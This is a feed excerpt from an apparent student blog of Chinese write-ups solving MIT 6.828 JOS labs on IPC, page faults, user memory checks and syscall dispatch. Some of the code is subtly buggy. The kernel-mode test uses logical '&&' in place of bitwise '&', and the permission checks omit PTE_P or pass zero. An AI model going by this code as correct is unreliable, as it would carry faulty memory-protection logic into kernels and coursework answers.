class="line"><span class="comment">//发送成功</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(r == -E_IPC_NOT_RECV)&#123;<span class="comment">//接受进程为准备好</span></span><br><span class="line">sys_yield();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">panic(<span class="string">&quot;ipc_send(): %e\n&quot;</span>,r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int32_t</span></span><br><span class="line">ipc_recv(<span class="keyword">envid_t</span> *from_env_store, <span class="keyword">void</span> *pg, <span class="keyword">int</span> *perm_store)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;ipc_recv not implemented&quot;);</span></span><br><span class="line"><span class="keyword">if</span>(pg == <span class="literal">NULL</span>)&#123;</span><br><span class="line">pg = (<span class="keyword">void</span>*)<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> r = sys_ipc_recv(pg);</span><br><span class="line"><span class="keyword">if</span>(r &lt; <span class="number">0</span>)&#123; <span class="comment">//error</span></span><br><span class="line"><span class="keyword">if</span>(from_env_store) *from_env_store = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(perm_store) *perm_store = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> r; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(from_env_store)&#123;</span><br><span class="line">*from_env_store = thisenv-&gt;env_ipc_from;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(perm_store)&#123;</span><br><span class="line">*perm_store = thisenv-&gt;env_ipc_perm;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> thisenv-&gt;env_ipc_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IPC总结图如下：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab4/lab4_5_IPC%E5%8E%9F%E7%90%86.png" alt="JOS IPC原理"></p><p>这里其实是有两个功能，传值和映射共同地址，但是映射地址的功能不一定是要用上的，具体怎么操作看代码和注释吧，注释写得挺详细的。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13884924720/0" alt="image-20210815165636781"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本实现主要是围绕进程这个概念来展开的，主要介绍四部分：</p><ol><li><p><strong>支持多处理器</strong>。现代的处理器一般都是多核的，并且会有多个处理器，这样每个CPU能同时允许不同的进程，实现并行。。需要用锁解决多CPU的竞争。 CPU和进程在内核中的数据结构如下图所示：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab4/lab4_2_cpu%E5%92%8CEnv%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="Env和CpuInfo关系"></p></li><li><p><strong>实现进程调度</strong>。 一种是非抢占式式的，另一种是抢占式的，借助时钟中断实现，时钟中断到来时，内核调用sched_yield()选择另一个Env结构执行。</p></li><li><p><strong>实现写时复制fork</strong>(进程创建)。fork是库函数，会调用sys_exofork这个系统调用，该系统调用在内核中为子进程创建一个新的Env结构，然后将父进程的寄存器状态复制给该Env结构，复制页表，对于PTE_W为1的页表，复制的同时，设置PTE_COW标志。为父进程和子进程设置缺页处理函数，处理逻辑就是：当缺页中断发生是因为写时拷贝的地址，分配一个新的物理页，然后将该虚拟地址映射到新的物理页。</p><p>原理图上面有</p></li><li><p><strong>实现进程间通信</strong>。本质还是进入内核修改Env结构的页映射关系。原理图见上。</p></li></ol>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/08/08/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab4/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab3-Exercise9</title>
      <link>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise9/</link>
      <guid>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise9/</guid>
      <pubDate>Fri, 06 Aug 2021 15:31:41 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;修改kern/trap.c文件，使其能够实现：当在内核模式下发现页错，trap.c 文件会panic。&lt;/p&gt;
&lt;h3 id=&quot;分析&quot;&gt;&lt;a
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>修改kern/trap.c文件，使其能够实现：当在内核模式下发现页错，trap.c 文件会panic。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目要求我们在检测到这个 page fault 是出现在内核态时，要把这个事件 panic 出来，所以我们把 page_fault_handler 文件修改如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">page_fault_handler(struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> fault_va;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read processor&#x27;s CR2 register to find the faulting address</span></span><br><span class="line">fault_va = rcr2();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle kernel-mode page faults.</span></span><br><span class="line"><span class="keyword">if</span>((tf-&gt;tf_cs &amp;&amp; <span class="number">0x1</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">panic(<span class="string">&quot;page fault in kernel-mode,fault address %d\n&quot;</span>,fault_va);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// We&#x27;ve already handled kernel-mode exceptions, so if we get here,</span></span><br><span class="line"><span class="comment">// the page fault happened in user mode.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Destroy the environment that caused the fault.</span></span><br><span class="line">cprintf(<span class="string">&quot;[%08x] user fault va %08x ip %08x\n&quot;</span>,</span><br><span class="line">curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);</span><br><span class="line">print_trapframe(tf);</span><br><span class="line">env_destroy(curenv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后根据题目的要求，我们还要继续完善 kern/pmap.c 文件中的 user_mem_assert , user_mem_check 函数，通过观察 user_mem_assert 函数我们发现，它调用了 user_mem_check 函数。而 user_mem_check 函数的功能是检查一下当前用户态程序是否有对虚拟地址空间 [va, va+len] 的 perm| PTE_P 访问权限。</p><p>自然我们要做的事情应该是，先找到这个虚拟地址范围对应于当前用户态程序的页表中的页表项，然后再去看一下这个页表项中有关访问权限的字段，是否包含 perm | PTE_P，只要有一个页表项是不包含的，就代表程序对这个范围的虚拟地址没有 perm|PTE_P 的访问权限。以上就是这段代码的大致思想</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">user_mem_check(struct Env *env, <span class="keyword">const</span> <span class="keyword">void</span> *va, <span class="keyword">size_t</span> len, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">cprintf(<span class="string">&quot;user_mem_check va: %x, len: %x\n&quot;</span>, va, len);</span><br><span class="line"><span class="keyword">char</span> *begin = ROUNDDOWN((<span class="keyword">char</span> *)va,PGSIZE);</span><br><span class="line"><span class="keyword">char</span> *end = ROUNDUP((<span class="keyword">char</span> *)(va + len),PGSIZE);</span><br><span class="line"><span class="keyword">pte_t</span> * cur_pte = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span>(;begin &lt; end ; begin += PGSIZE)&#123;</span><br><span class="line">cur_pte = pgdir_walk(env-&gt;env_pgdir,(<span class="keyword">void</span> *)begin,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">int</span>)begin &gt; ULIM || cur_pte == <span class="literal">NULL</span> || ((<span class="keyword">uint32_t</span>)(*cur_pte) &amp; perm) != perm)&#123;</span><br><span class="line">user_mem_check_addr = (begin &lt; (<span class="keyword">uint32_t</span>)va ? (<span class="keyword">uint32_t</span>)va : begin);<span class="comment">//记录无效的虚拟地址</span></span><br><span class="line">            <span class="keyword">return</span> -E_FAULT;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后按照题目要求我们还要补全 kern/syscall.c 文件中的一部分内容，即 sys_cputs 函数，这个函数要求检查用户程序对虚拟地指空间 [s, s+len] 是否有访问权限，所以我们恰好可以使用刚刚写好的函数 user_mem_assert() 来实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">sys_cputs(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">size_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Check that the user has permission to read memory [s, s+len).</span></span><br><span class="line"><span class="comment">// Destroy the environment if not.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">user_mem_assert(curenv,s,len,<span class="number">0</span>);</span><br><span class="line"><span class="comment">// Print the string supplied by the user.</span></span><br><span class="line">cprintf(<span class="string">&quot;%.*s&quot;</span>, len, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我们就完成了这个练习，可以运行一下 make run-buggyhello，看一下它是否按照题目的要求输出了信息。</p><p>其实 Exercise 9 完成后，Exercise 10 其实也完成了，你可以直接运行 make run-evilhello，看一下是否输出要求的结果。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise9/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab3-Exercise7</title>
      <link>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise7/</link>
      <guid>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise7/</guid>
      <pubDate>Fri, 06 Aug 2021 08:07:46 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;给中断向量T_SYSCALL编写一个中断处理函数。我们需要去编辑kern/trapentry.S和kern/trap.c中的trap_ini
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>给中断向量T_SYSCALL编写一个中断处理函数。我们需要去编辑kern/trapentry.S和kern/trap.c中的trap_init函数。也需要去修改trap_dispatch()函数，使他能够通过调用syscall()(在kern/syscall.h中定义)函数处理系统调用中断。最终你需要去实现kern/syscall.c中的syscall函数。确保这个函数会在系统调用号为非法值时返回-E_INVAL。我们应该充分理解lib/syscall.c文件。我们要处理在inc/syscall.h文件中定义的所有系统调用。通过make run-hello指令来运行 user/hello 程序，它应该在控制台上输出 “hello, world” 然后出发一个页中断。如果没有发生的话，代表你编写的系统调用处理函数是不正确的</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们需要了解一下系统调用的整个流程，如果现在运行的是内核态的程序的话，此时调用了一个系统调用，比如 sys_cputs 函数时，此时不会触发中断，那么系统会直接执行定义在 lib/syscall.c 文件中的 sys_cputs，我们可以看一下这个文件，可以发现这个文件中定义了几个比较常用的系统调用，包括 sys_cputs, sys_cgetc 等等。我们还会发现他们都是统一调用一个 syscall 函数，通过这个函数的代码发现其实它是执行了一个汇编指令。所以最终是这个函数完成了系统调用。</p><p>以上是运行在内核态下的程序，调用系统调用时的流程。</p><p>但是如果是用户态程序呢？这个练习就是让我们编写程序使我们的用户程序在调用系统调用时，最终也能经过一系列的处理最终去执行 lib/syscall.c 中的 syscall 指令。</p><p>让我们看一下这个过程，当用户程序中要调用系统调用时，比如 sys_cputs，从它的汇编代码中我们会发现，它会执行一个 int $0x30 指令，这个指令就是软件中断指令，这个中断的中断号就是 0x30，即 T_SYSCALL，所以题目中让我们首先为这个中断号编写一个中断处理函数，我们首先就要在 kern/trapentry.S 文件中为它声明它的中断处理函数，即TRAPHANDLER_NOEC，就像我们为其他中断号所做的那样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TRAPHANDLER_NOEC(t_divide, T_DIVIDE)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">TRAPHANDLER_NOEC(t_syscall, T_SYSCALL)</span><br></pre></td></tr></table></figure><p>然后在trap.c 文件中声明 t_syscall() 函数。并且在 trap_init() 函数中为它注册</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kern/trap.c</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t_fperr</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t_align</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t_mchk</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t_simderr</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t_syscall</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">trap_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">Segdesc</span> <span class="title">gdt</span>[];</span></span><br><span class="line">    </span><br><span class="line">        .....</span><br><span class="line">    SETGATE(idt[T_ALIGN], <span class="number">0</span>, GD_KT, t_align, <span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[T_MCHK], <span class="number">0</span>, GD_KT, t_mchk, <span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[T_SIMDERR], <span class="number">0</span>, GD_KT, t_simderr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    SETGATE(idt[T_SYSCALL], <span class="number">0</span>, GD_KT, t_syscall, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">// Per-CPU setup </span></span><br><span class="line">    trap_init_percpu();</span><br></pre></td></tr></table></figure><p>此时当系统调用中断发生时，系统就可以捕捉到这个中断了，中断发生时，系统就会压入error code和trapno然后jump到_alltraps去执行，并且最终来到trap()函数处，进入trap函数后，经过一系列处理进入 trap_dispatch 函数。题目中要求此时我们需要去调用 kern/syscall.c 中的syscall函数，这里注意，这个函数可不是 lib/syscall.c 中的 syscall 函数。</p><p>我们修改我们的代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">trap_dispatch(struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Handle processor exceptions.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_PGFLT) &#123;</span><br><span class="line">page_fault_handler(tf);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_BRKPT) &#123;</span><br><span class="line">monitor(tf);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_SYSCALL) &#123;</span><br><span class="line">tf-&gt;tf_regs.reg_eax = syscall(tf-&gt;tf_regs.reg_eax, tf-&gt;tf_regs.reg_edx, tf-&gt;tf_regs.reg_ecx,</span><br><span class="line">tf-&gt;tf_regs.reg_ebx, tf-&gt;tf_regs.reg_edi, tf-&gt;tf_regs.reg_esi);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unexpected trap: The user process or the kernel has a bug.</span></span><br><span class="line">print_trapframe(tf);</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_cs == GD_KT)</span><br><span class="line">panic(<span class="string">&quot;unhandled trap in kernel&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">env_destroy(curenv);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后修改我们kern/syscall.c中的syscall函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int32_t</span></span><br><span class="line">syscall(<span class="keyword">uint32_t</span> syscallno, <span class="keyword">uint32_t</span> a1, <span class="keyword">uint32_t</span> a2, <span class="keyword">uint32_t</span> a3, <span class="keyword">uint32_t</span> a4, <span class="keyword">uint32_t</span> a5)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Call the function corresponding to the &#x27;syscallno&#x27; parameter.</span></span><br><span class="line"><span class="comment">// Return any appropriate return value.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//panic(&quot;syscall not implemented&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (syscallno) &#123;</span><br><span class="line"><span class="keyword">case</span> (SYS_cputs):</span><br><span class="line">sys_cputs((<span class="keyword">const</span> <span class="keyword">char</span>*)a1,a2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> (SYS_cgetc):</span><br><span class="line"><span class="keyword">return</span> sys_cgetc();</span><br><span class="line"><span class="keyword">case</span> (SYS_getenvid):</span><br><span class="line"><span class="keyword">return</span> sys_getenvid();</span><br><span class="line"><span class="keyword">case</span> (SYS_env_destroy):</span><br><span class="line"><span class="keyword">return</span> sys_env_destroy(a1);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在回顾一下系统调用的完成流程：以user/hello.c为例，其中调用了cprintf()，注意这是lib/print.c中的cprintf，该cprintf()最终会调用lib/syscall.c中的sys_cputs()，sys_cputs()又会调用lib/syscall.c中的syscall()，该函数将系统调用号放入%eax寄存器，五个参数依次放入in DX, CX, BX, DI, SI，然后执行指令int 0x30，发生中断后，去IDT中查找中断处理函数，最终会走到kern/trap.c的trap_dispatch()中，我们根据中断号0x30，又会调用kern/syscall.c中的syscall()函数（注意这时候我们已经进入了内核模式CPL=0），在该函数中根据系统调用号调用kern/print.c中的cprintf()函数，该函数最终调用kern/console.c中的cputchar()将字符串打印到控制台。当trap_dispatch()返回后，trap()会调用<code>env_run(curenv);</code>，该函数前面讲过，会将curenv-&gt;env_tf结构中保存的寄存器快照重新恢复到寄存器中，这样又会回到用户程序系统调用之后的那条指令运行，只是这时候已经执行了系统调用并且寄存器eax中保存着系统调用的返回值。任务完成重新回到用户模式CPL=3。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise7/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab3-Exercise6</title>
      <link>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise6/</link>
      <guid>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise6/</guid>
      <pubDate>Fri, 06 Aug 2021 05:26:10 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;修改trap_dispatch()使断点异常发生时，能够触发kernel monitor。修改完成后运行 make grade，运行结果应该
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>修改trap_dispatch()使断点异常发生时，能够触发kernel monitor。修改完成后运行 make grade，运行结果应该是你修改后的 JOS 能够正确运行 breakpoint 测试程序。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个练习其实和上一个练习是类似的，只不过是在这里我们需要处理断点中断 (T_BRKPT)，kernel monitor 就是定义在 kern/monitor.c 文件中的 monitor 函数，所以修改后的程序如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">trap_dispatch(struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Handle processor exceptions.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_PGFLT) &#123;</span><br><span class="line">page_fault_handler(tf);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_BRKPT) &#123;</span><br><span class="line">monitor(tf);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Unexpected trap: The user process or the kernel has a bug.</span></span><br><span class="line">print_trapframe(tf);</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_cs == GD_KT)</span><br><span class="line">panic(<span class="string">&quot;unhandled trap in kernel&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">env_destroy(curenv);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise6/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab3-Exercise5</title>
      <link>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise5/</link>
      <guid>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise5/</guid>
      <pubDate>Fri, 06 Aug 2021 05:00:17 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;修改一下 trap_dispatch 函数，使系统能够把缺页异常引导到 page_fault_handler() 上执行。在修改完成后，运行
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>修改一下 trap_dispatch 函数，使系统能够把缺页异常引导到 page_fault_handler() 上执行。在修改完成后，运行 make grade，出现的结果应该是你修改后的 JOS 可以成功运行 faultread，faultreadkernel，faultwrite，faultwritekernel 测试程序。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>据 trapentry.S 文件中的 TRAPHANDLER 函数可知，这个函数会把当前中断的中断码压入堆栈中，再根据 inc/trap.h 文件中的 Trapframe 结构体我们可以知道，Trapframe 中的 tf_trapno 成员代表这个中断的中断码。所以在 trap_dispatch 函数中我们需要根据输入的 Trapframe 指针 tf 中的 tf_trapno 成员来判断到来的中断是什么中断，这里我们需要判断是否是缺页中断，如果是则执行 page_fault_handler 函数，所以我们可以这么修改代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">trap_dispatch(struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Handle processor exceptions.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_PGFLT) &#123;</span><br><span class="line">page_fault_handler(tf);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Unexpected trap: The user process or the kernel has a bug.</span></span><br><span class="line">print_trapframe(tf);</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_cs == GD_KT)</span><br><span class="line">panic(<span class="string">&quot;unhandled trap in kernel&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">env_destroy(curenv);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise5/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab3-Exercise4</title>
      <link>https://billyotry.github.io/2021/08/05/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise4/</link>
      <guid>https://billyotry.github.io/2021/08/05/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise4/</guid>
      <pubDate>Thu, 05 Aug 2021 13:37:30 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;编辑一下trapentry.S 和 trap.c 文件，并且实现上面所说的功能。宏定义 TRAPHANDLER 和 TRAPHANDLER_
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>编辑一下trapentry.S 和 trap.c 文件，并且实现上面所说的功能。宏定义 TRAPHANDLER 和 TRAPHANDLER_NOEC 会对你有帮助。你将会在 trapentry.S文件中为在inc/trap.h文件中的每一个trap加入一个入口值， 你也将会提供_alttraps的值。</p><p>你需要修改trap_init()函数来初始化idt表，使表中每一项指向定义在trapentry.S中的入口指针，SETGATE宏定义在这里用得上。</p><p>　　　　你所实现的 _alltraps 应该：</p><p>　　　　1. 把值压入堆栈使堆栈看起来像一个结构体 Trapframe</p><p>　　　　2. 加载 GD_KD 的值到 %ds, %es寄存器中</p><p>　　　　3. 把%esp的值压入，并且传递一个指向Trapframe的指针到trap()函数中。</p><p>　　　　4. 调用trap</p><p>　　考虑使用pushal指令，他会很好的和结构体 Trapframe 的布局配合好。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先看一下 trapentry.S 文件，里面定义了两个宏定义，TRAPHANDLER，TRAPHANDLER_NOEC。他们的功能从汇编代码中可以看出：声明了一个全局符号name，并且这个符号是函数类型的，代表它是一个中断处理函数名。其实这里就是两个宏定义的函数。这两个函数就是当系统检测到一个中断/异常时，需要首先完成的一部分操作，包括：中断异常码，中断错误码(error code)。正是因为有些中断有中断错误码，有些没有，所以我们采用利用两个宏定义函数。</p><p>然后就会调用alltraps，_alltraps函数其实就是为了能够让程序在之后调用trap.c中的trap函数时，能够正确的访问到输入的参数，即Trapframe指针类型的输入参数tf。</p><p>所以在trapentry.S中，我们要根据这个中断是否有中断错误码，来选择调用TRAPHANDLER，还是TRAPHANDLER_NOEC，然后再统一调用_alltraps，其实目的就是为了能够让系统在正式运行中断处理程序之前完成必要的准备工作，比如保存现场等等</p><p>查看<a href="https://link.zhihu.com/?target=https%3A//pdos.csail.mit.edu/6.828/2018/readings/i386/s09_08.htm">x86所有异常</a>后我们可以知道哪些需要压入压入error code，哪些不用来决定到底使用哪个宏。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">TRAPHANDLER_NOEC(t_divide, T_DIVIDE)</span><br><span class="line">TRAPHANDLER_NOEC(t_debug, T_DEBUG)</span><br><span class="line">TRAPHANDLER_NOEC(t_nmi, T_NMI)</span><br><span class="line">TRAPHANDLER_NOEC(t_brkpt, T_BRKPT)</span><br><span class="line">TRAPHANDLER_NOEC(t_oflow, T_OFLOW)</span><br><span class="line">TRAPHANDLER_NOEC(t_bound, T_BOUND)</span><br><span class="line">TRAPHANDLER_NOEC(t_illop, T_ILLOP)</span><br><span class="line">TRAPHANDLER_NOEC(t_device, T_DEVICE)</span><br><span class="line">TRAPHANDLER(t_dblflt, T_DBLFLT)</span><br><span class="line">TRAPHANDLER(t_tss, T_TSS)</span><br><span class="line">TRAPHANDLER(t_segnp, T_SEGNP)</span><br><span class="line">TRAPHANDLER(t_stack, T_STACK)</span><br><span class="line">TRAPHANDLER(t_gpflt, T_GPFLT)</span><br><span class="line">TRAPHANDLER(t_pgflt, T_PGFLT)</span><br><span class="line">TRAPHANDLER(t_fperr, T_FPERR)</span><br><span class="line">TRAPHANDLER(t_align, T_ALIGN)</span><br><span class="line">TRAPHANDLER(t_mchk, T_MCHK)</span><br><span class="line">TRAPHANDLER(t_simderr, T_SIMDERR)</span><br><span class="line"></span><br><span class="line">TRAPHANDLER_NOEC(t_syscall, 